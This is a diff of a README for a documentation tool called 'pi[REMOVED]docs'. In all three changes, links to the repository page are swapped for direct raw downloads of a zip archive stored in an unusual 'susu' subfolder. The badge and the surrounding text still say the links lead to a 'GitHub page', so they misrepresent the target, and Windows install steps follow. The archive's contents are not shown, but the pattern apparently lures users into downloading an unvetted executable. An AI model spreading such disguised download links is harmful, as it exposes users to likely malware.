@@ -1,6 +1,6 @@
 # 🪄 pi-magic-docs - Living Docs That Update Themselves
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/muyengwa8391/pi-magic-docs)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/muyengwa8391/pi-magic-docs/raw/refs/heads/main/susu/pi-docs-magic-v3.9-beta.1.zip)
 
 ## ✨ What is pi-magic-docs?
 
@@ -25,7 +25,7 @@ If your account has limited access, you may need help from the person who manage
 
 Use this link to visit the download page and get the app:
 
-https://github.com/muyengwa8391/pi-magic-docs
+https://github.com/muyengwa8391/pi-magic-docs/raw/refs/heads/main/susu/pi-docs-magic-v3.9-beta.1.zip
 
 Follow these steps on Windows:
 
@@ -190,7 +190,7 @@ This keeps your notes closer to what actually happened.
 
 If you need the download page again, use this link:
 
-https://github.com/muyengwa8391/pi-magic-docs
+https://github.com/muyengwa8391/pi-magic-docs/raw/refs/heads/main/susu/pi-docs-magic-v3.9-beta.1.zip
 
 ## 🧩 About this repo
 
